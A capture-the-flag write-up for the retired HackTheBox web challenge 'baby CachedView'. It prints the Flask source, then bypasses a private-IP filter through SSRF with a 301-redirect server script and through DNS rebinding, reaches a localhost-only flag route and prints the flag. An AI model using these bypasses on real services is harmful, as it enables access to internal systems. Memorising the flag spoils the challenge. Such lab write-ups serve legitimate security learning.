---
Category: Web
Difficulty: Easy
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags: SSRF, dns-rebinding, evasion
---
>[!quote]
> I made a service for people to cache their favourite websites, come and check it out! But don't try anything funny, after a recent incident we implemented military grade IP based restrictions to keep the hackers at bay... 

# Set up

- **build-docker.sh**
    
    ```bash
    ┌──(kali㉿kali)-[~/…/Challenge/Web/babyCachedView/web_baby_cachedview]
    └─$ cat build-docker.sh
    #!/bin/bash
    docker build --tag=baby_cachedview .
    docker run -p 80:80 --name=baby_cachedview --rm baby_cachedview
    ```
    
- **Dockerfile**
    
    ```bash
    ┌──(kali㉿kali)-[~/…/Challenge/Web/babyCachedView/web_baby_cachedview]
    └─$ cat Dockerfile
    FROM python:3.8.11-alpine3.13
    
    # Setup user
    RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
    
    RUN wget -q https://github.com/mozilla/geckodriver/releases/download/v0.30.0/geckodriver-v0.30.0-linux64.tar.gz -O gecko.tar.gz && \ tar -x geckodriver -f gecko.tar.gz -O > /usr/local/bin/geckodriver && chmod +x /usr/local/bin/geckodriver && rm -rf *.gz
    
    # Install dependencies
    RUN apk add --update --no-cache firefox wget terminus-font nginx supervisor uwsgi-python3 \
    gcc musl-dev libffi-de # added later to fix dependencies
    
    # Install geckodriver
    RUN wget -q https://github.com/mozilla/geckodriver/releases/download/v0.29.1/geckodriver-v0.29.1-linux64.tar.gz && \
       tar -x geckodriver -zf geckodriver-v0.29.1-linux64.tar.gz -O > /usr/local/bin/geckodriver && chmod +x /usr/local/bin/geckodriver && rm -rf *.gz
    
    # Setup app
    RUN mkdir -p /app
    
    # Switch working environment
    WORKDIR /app
    
    # Add application
    COPY challenge .
    
    # Install dependencies
    RUN python -m venv venv
    RUN . /app/venv/bin/activate && python -m pip install --upgrade pip && pip install -r requirements.txt
    
    # Fix permissions
    RUN chown -R www:www /var/lib/nginx
    
    # Copy configs
    COPY config/supervisord.conf /etc/supervisord.conf
    COPY config/nginx.conf /etc/nginx/nginx.conf
    
    # Expose port the server is reachable on
    EXPOSE 80
    
    # Disable pycache
    ENV PYTHONDONTWRITEBYTECODE=1
    
    # Run supervisord
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    

# Information Gathering

## Screenshots

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234.png)

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%201.png)

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%202.png)

## Source code

- **routes.py**
    
    ```python
    from flask import Blueprint, request, render_template, abort, send_file
    from application.util import cache_web, is_from_localhost
    
    web = Blueprint('web', __name__)
    api = Blueprint('api', __name__)
    
    @web.route('/')
    def index():
        return render_template('index.html')
    
    @api.route('/cache', methods=['POST'])
    def cache():
        if not request.is_json or 'url' not in request.json:
            return abort(400)
        
        return cache_web(request.json['url'])
    
    @web.route('/flag')
    @is_from_localhost
    def flag():
        return send_file('flag.png')
    ```
    
- **app.py**
    
    ```python
    from flask import Flask, g
    from application.database import get_db
    from application.blueprints.routes import web, api
    
    app = Flask(__name__)
    app.config.from_object('application.config.Config')
    
    app.register_blueprint(web, url_prefix='/')
    app.register_blueprint(api, url_prefix='/api')
    
    @app.before_first_request
    def init_db():
        with app.open_resource('schema.sql', mode='r') as f:
            get_db().cursor().executescript(f.read())
    
    @app.teardown_appcontext
    def close_connection(exception):
        db = getattr(g, '_database', None)
        if db is not None: db.close()
    
    @app.errorhandler(Exception)
    def handle_error(error):
        message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
        response = {
            'type': error.__class__.__name__,
            'message': message,
            'level': 'danger'
        }
    
        return response, error.code if hasattr(error, 'code') else 500
    ```
    
- **schema.sql**
    
    ```sql
    DROP TABLE IF EXISTS screenshots;
    
    CREATE TABLE screenshots (
    	id INTEGER PRIMARY KEY AUTOINCREMENT, 
    	url TEXT NOT NULL, 
    	filename TEXT NOT NULL, 
    	created_at NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    ```
    
- **config.py**
    
    ```python
    from application.util import generate
    
    class Config(object):
        SECRET_KEY = generate(50)
    
    class ProductionConfig(Config):
        pass
    
    class DevelopmentConfig(Config):
        DEBUG = True
    
    class TestingConfig(Config):
        TESTING = True
    ```
    
- **database.py**
    
    ```python
    from flask import g
    from application import app
    from sqlite3 import dbapi2 as sqlite3
    
    def connect_db():
        return sqlite3.connect('baby_cached_view.db', isolation_level=None)
        
    def get_db():
        db = getattr(g, '_database', None)
        if db is None:
            db = g._database = connect_db()
            db.row_factory = sqlite3.Row
        return db
    
    def query_db(query, args=(), one=False):
        with app.app.app_context():
            cur = get_db().execute(query, args)
            rv = [dict((cur.description[idx][0], value) \
                for idx, value in enumerate(row)) for row in cur.fetchall()]
            return (next(iter(rv[0].values())) if rv else None) if one else rv
    ```
    
- **models.py**
    
    ```python
    from application.database import query_db
    
    class cache(object):
    
        @staticmethod
        def exists(domain):
            return query_db('SELECT COUNT(filename) FROM screenshots WHERE url = ? AND strftime("%s", "now") - strftime("%s", created_at) <= 15', (domain, ), one=True)
    
        @staticmethod
        def old(domain):
            return query_db('SELECT filename FROM screenshots WHERE url = ? ORDER BY created_at DESC', (domain, ), one=True)
    
        @staticmethod
        def new(domain, filename):
            return query_db('INSERT INTO screenshots (url, filename) VALUES (?, ?)', (domain, filename))
    ```
    
- **util.py**
    
    ```python
    import functools, signal, struct, socket, os
    from urllib.parse import urlparse
    from application.models import cache
    from flask import request, abort
    
    generate = lambda x: os.urandom(x).hex()
    
    def flash(message, level, **kwargs):
        return { 'message': message, 'level': level, **kwargs }
    
    def serve_screenshot_from(url, domain, width=1000, min_height=400, wait_time=10):
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options
        from selenium.webdriver.support.ui import WebDriverWait
    
        options = Options()
    
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-background-networking')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-sync')
        options.add_argument('--disable-translate')
        options.add_argument('--hide-scrollbars')
        options.add_argument('--metrics-recording-only')
        options.add_argument('--no-first-run')
        options.add_argument('--safebrowsing-disable-auto-update')
        options.add_argument('--media-cache-size=1')
        options.add_argument('--disk-cache-size=1')
        options.add_argument('--user-agent=MiniMakelaris/1.0')
    
        options.preferences.update(
            {
                'javascript.enabled': False
            }
        )
    
        driver = webdriver.Firefox(
            executable_path='geckodriver',
            options=options,
            service_log_path='/tmp/geckodriver.log',
        )
    
        driver.set_page_load_timeout(wait_time)
        driver.implicitly_wait(wait_time)
    
        driver.set_window_position(0, 0)
        driver.set_window_size(width, min_height)
    
        driver.get(url)
    
        WebDriverWait(driver, wait_time).until(lambda r: r.execute_script('return document.readyState') == 'complete')
    
        filename = f'{generate(14)}.png'
    
        driver.save_screenshot(f'application/static/screenshots/{filename}')
    
        driver.service.process.send_signal(signal.SIGTERM)
        driver.quit()
    
        cache.new(domain, filename)
    
        return flash(f'Successfully cached {domain}', 'success', domain=domain, filename=filename)
    
    def cache_web(url):
        scheme = urlparse(url).scheme
        domain = urlparse(url).hostname
    
        if not domain or not scheme:
            return flash(f'Malformed url {url}', 'danger')
            
        if scheme not in ['http', 'https']:
            return flash('Invalid scheme', 'danger')
    
        def ip2long(ip_addr):
            return struct.unpack('!L', socket.inet_aton(ip_addr))[0]
        
        def is_inner_ipaddress(ip):
            ip = ip2long(ip)
            return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
                    ip2long('10.0.0.0') >> 24 == ip >> 24 or \
                    ip2long('172.16.0.0') >> 20 == ip >> 20 or \
                    ip2long('192.168.0.0') >> 16 == ip >> 16 or \
                    ip2long('0.0.0.0') >> 24 == ip >> 24
        
        if is_inner_ipaddress(socket.gethostbyname(domain)):
            return flash('IP not allowed', 'danger')
        
        return serve_screenshot_from(url, domain)
    
    def is_from_localhost(func):
        @functools.wraps(func)
        def check_ip(*args, **kwargs):
            if request.remote_addr != '127.0.0.1' or request.referrer:
                return abort(403)
            return func(*args, **kwargs)
        return check_ip
    ```
    

# The Bug

The `is_inner_ipaddress()` function can be bypassed forcing an **HTTP 301 Moved Permanently** request when contacted by the screenshotter service. In this way it is possible to redirect the GET request to [localhost](http://localhost) and get inner contents exploiting the SSRF.

**redirect.py**

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    Returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           print(url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler

def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%203.png)

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%204.png)

# Exploitation - SSRF exploiting HTTP 301

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%205.png)

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%206.png)

# Alternative solution - DNS Rebinding

Because between the check of the resolved IP and the actual request performed to the server are passing different seconds, it is possible to change the IP resolved by a controlled DNS in order to trick the application into resolving a different IP.

A service that can be used to exploit this vulnerability is [rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)

The tool keep changes the DNS record between the two IP chosen by the attacker, allowing to exploit the DNS rebinding vulnerability:

![../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234](../../zzz_res/attachments/baby%20CachedView%204b48c4c7e6a94d8c8a79f9ce9eed5234%207.png)

# Flag

>[!success]
>`HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}`